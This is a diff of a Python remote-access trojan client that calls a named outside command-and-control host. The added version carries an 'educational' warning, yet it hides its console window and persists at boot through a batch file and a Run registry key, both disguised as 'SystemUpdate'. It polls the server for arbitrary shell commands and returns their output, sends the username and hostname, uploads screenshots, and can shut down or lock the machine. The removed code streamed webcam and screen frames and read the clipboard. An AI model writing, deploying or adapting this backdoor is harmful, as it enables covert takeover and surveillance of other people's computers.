@@ -1,152 +1,151 @@
 #!/usr/bin/env python3
 """
-🎯 CLOUD C2 CLIENT - PXXL VERSION
+🎯 PERSISTENT EDUCATIONAL CLIENT
+⚠️  ONLY run on YOUR OWN computer!
 """
-import requests, subprocess, platform, time, uuid, os
-import threading
+
+import requests
+import subprocess
+import platform
+import time
+import uuid
+import os
+import socket
+import getpass
 import base64
-import pyperclip
-import cv2
-import mss
-import numpy as np
+import io
 
 # ============================================================
-# YOUR PXXL URL
+# CHANGE THIS TO YOUR RENDER URL AFTER DEPLOYING
 # ============================================================
+
 C2_URL = "https://c23.pxxlspace.cv"
-CLIENT_ID = str(uuid.uuid4())[:8]
 
 # ============================================================
-# AUTO-START ON BOOT
-# ============================================================
+
+CLIENT_ID_FILE = os.path.join(os.path.expanduser("~"), ".client_id")
+
+def get_client_id():
+    if os.path.exists(CLIENT_ID_FILE):
+        with open(CLIENT_ID_FILE, 'r') as f:
+            return f.read().strip()
+    else:
+        client_id = str(uuid.uuid4())[:8]
+        with open(CLIENT_ID_FILE, 'w') as f:
+            f.write(client_id)
+        return client_id
+
+CLIENT_ID = get_client_id()
+
 def add_to_startup():
+    script_path = os.path.abspath(__file__)
     if platform.system() == 'Windows':
-        script_path = os.path.abspath(__file__)
         startup_folder = os.path.expanduser(r'~\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup')
-        bat_path = os.path.join(startup_folder, 'c23_client_start.bat')
-        
+        bat_path = os.path.join(startup_folder, 'system_update.bat')
         with open(bat_path, 'w') as f:
-            f.write(f'@echo off\n')
-            f.write(f'title Cloud C2 Client - {platform.node()}\n')
-            f.write(f'python "{script_path}"\n')
-        
-        print(f"[+] Auto-start installed.")
+            f.write(f'@echo off\nstart "" pythonw "{script_path}"\n')
+        try:
+            import winreg
+            key = winreg.HKEY_CURRENT_USER
+            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
+            with winreg.OpenKey(key, key_path, 0, winreg.KEY_SET_VALUE) as reg_key:
+                winreg.SetValueEx(reg_key, "SystemUpdate", 0, winreg.REG_SZ, f'pythonw "{script_path}"')
+        except:
+            pass
 
-# ============================================================
-# COMMUNICATION
-# ============================================================
 def register():
     try:
-        requests.post(f"{C2_URL}/register", json={
-            'client_id': CLIENT_ID, 'hostname': platform.node(), 'os': platform.system()
-        }, timeout=5)
-    except: pass
+        response = requests.post(
+            f"{C2_URL}/register",
+            json={
+                'client_id': CLIENT_ID,
+                'hostname': platform.node(),
+                'os': f"{platform.system()} {platform.release()}",
+                'username': getpass.getuser()
+            },
+            timeout=5
+        )
+        return response.status_code == 200
+    except:
+        return False
 
 def get_command():
     try:
-        r = requests.get(f"{C2_URL}/get_command/{CLIENT_ID}", timeout=5)
-        if r.status_code == 200: return r.json().get('command')
-    except: pass
-    return None
+        response = requests.get(f"{C2_URL}/get_command/{CLIENT_ID}", timeout=5)
+        if response.status_code == 200:
+            return response.json().get('command')
+        return None
+    except:
+        return None
 
-def send_result(cmd, out):
-    try: 
-        requests.post(f"{C2_URL}/send_result", json={'client_id': CLIENT_ID, 'command': cmd, 'output': out}, timeout=5)
-    except: pass
-
-# ============================================================
-# CAMERA & SCREEN THREADS
-# ============================================================
-def camera_worker():
-    cap = cv2.VideoCapture(0)
-    if not cap.isOpened():
-        print("[-] Could not open webcam.")
-        return
-        
-    while True:
-        ret, frame = cap.read()
-        if ret:
-            frame = cv2.resize(frame, (320, 240))
-            _, buffer = cv2.imencode('.jpg', frame)
-            b64 = base64.b64encode(buffer).decode()
-            try: 
-                requests.post(f"{C2_URL}/stream_frame/{CLIENT_ID}/camera", json={'image': b64}, timeout=3)
-            except: pass
-        time.sleep(0.5)
-
-def screen_worker():
-    with mss.mss() as sct:
-        monitor = sct.monitors[1]
-        while True:
-            try:
-                img = np.array(sct.grab(monitor))
-                frame = cv2.cvtColor(img, cv2.COLOR_BGRA2BGR)
-                frame = cv2.resize(frame, (640, 360))
-                _, buffer = cv2.imencode('.jpg', frame)
-                b64 = base64.b64encode(buffer).decode()
-                requests.post(f"{C2_URL}/stream_frame/{CLIENT_ID}/screen", json={'image': b64}, timeout=3)
-            except: pass
-            time.sleep(1)
-
-# ============================================================
-# COMMAND PROCESSOR
-# ============================================================
 def execute_command(cmd):
     try:
-        if cmd == 'clipboard':
-            return "[+] Clipboard Content:\n" + pyperclip.paste()
-        
-        elif cmd.startswith('tts:'):
-            text = cmd[4:]
+        if cmd.lower() == 'screenshot':
+            try:
+                from PIL import ImageGrab
+                screenshot = ImageGrab.grab()
+                img_bytes = io.BytesIO()
+                screenshot.save(img_bytes, format='PNG')
+                img_base64 = base64.b64encode(img_bytes.getvalue()).decode()
+                requests.post(f"{C2_URL}/upload_screenshot", json={'client_id': CLIENT_ID, 'image': img_base64}, timeout=10)
+                return '[+] Screenshot uploaded!'
+            except Exception as e:
+                return f'[-] Screenshot failed: {e}'
+        elif cmd.lower() == 'lock':
             if platform.system() == 'Windows':
-                ps = f'PowerShell -Command "Add-Type -AssemblyName System.Speech; (New-Object System.Speech.Synthesis.SpeechSynthesizer).Speak(\'{text}\')"'
-                subprocess.Popen(ps, shell=True)
-                return "[+] Spoken via TTS"
-            return "[-] TTS only works on Windows"
-            
+                subprocess.run('rundll32.exe user32.dll,LockWorkStation', shell=True)
+                return '[+] Locked!'
+            return '[-] Not supported'
+        elif cmd.lower() == 'shutdown':
+            if platform.system() == 'Windows':
+                subprocess.run('shutdown /s /t 60', shell=True)
+                return '[+] Shutdown in 60s'
+            return '[-] Not supported'
+        elif cmd.lower() == 'restart':
+            if platform.system() == 'Windows':
+                subprocess.run('shutdown /r /t 60', shell=True)
+                return '[+] Restart in 60s'
+            return '[-] Not supported'
+        elif cmd.lower() == 'info':
+            return f"Hostname: {platform.node()}\nOS: {platform.system()} {platform.release()}\nIP: {socket.gethostbyname(socket.gethostname())}\nUser: {getpass.getuser()}\nClient ID: {CLIENT_ID}"
         else:
-            r = subprocess.run(cmd, shell=True, capture_output=True, timeout=10, text=True)
-            out = r.stdout if r.stdout else r.stderr
-            return out if out else "[+] Executed"
-
+            result = subprocess.run(cmd, shell=True, capture_output=True, timeout=30, text=True, encoding='utf-8', errors='ignore')
+            output = result.stdout if result.stdout else result.stderr
+            return output if output else '[+] Command executed'
+    except subprocess.TimeoutExpired:
+        return '[-] Timed out'
     except Exception as e:
-        return f"[-] Error: {e}"
+        return f'[-] Error: {e}'
 
-# ============================================================
-# MAIN
-# ============================================================
-if __name__ == '__main__':
-    add_to_startup()
-    
+def send_result(command, output):
+    try:
+        requests.post(f"{C2_URL}/send_result", json={'client_id': CLIENT_ID, 'command': command, 'output': output}, timeout=5)
+    except:
+        pass
+
+def hide_console():
     if platform.system() == 'Windows':
-        os.system(f'title CLOUD C2 CLIENT - {CLIENT_ID} - DO NOT CLOSE')
-    
-    print(f"""
-╔═══════════════════════════════════════════════════════════════════╗
-║   🎯 CLOUD C2 CLIENT RUNNING                                      ║
-║                                                                   ║
-║   ID: {CLIENT_ID}                                                       ║
-║   Server: {C2_URL}                            ║
-║                                                                   ║
-║   Window is visible. It will auto-start when you reboot.          ║
-║   Press Ctrl+C to stop.                                           ║
-╚═══════════════════════════════════════════════════════════════════╝
-    """)
-    
-    threading.Thread(target=camera_worker, daemon=True).start()
-    threading.Thread(target=screen_worker, daemon=True).start()
-    
+        try:
+            import ctypes
+            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
+        except:
+            pass
+
+def main():
+    hide_console()
+    add_to_startup()
     register()
-    print("[+] Registered with server. Waiting for commands...")
-    
     while True:
         try:
-            cmd = get_command()
-            if cmd:
-                print(f"[*] Executing: {cmd}")
-                out = execute_command(cmd)
-                send_result(cmd, out)
-            time.sleep(2)
+            command = get_command()
+            if command:
+                output = execute_command(command)
+                send_result(command, output)
+            time.sleep(3)
         except KeyboardInterrupt:
-            print("\n[!] Stopped.")
             break
+        except:
+            time.sleep(5)
+
+if __name__ == "__main__":
+    main()
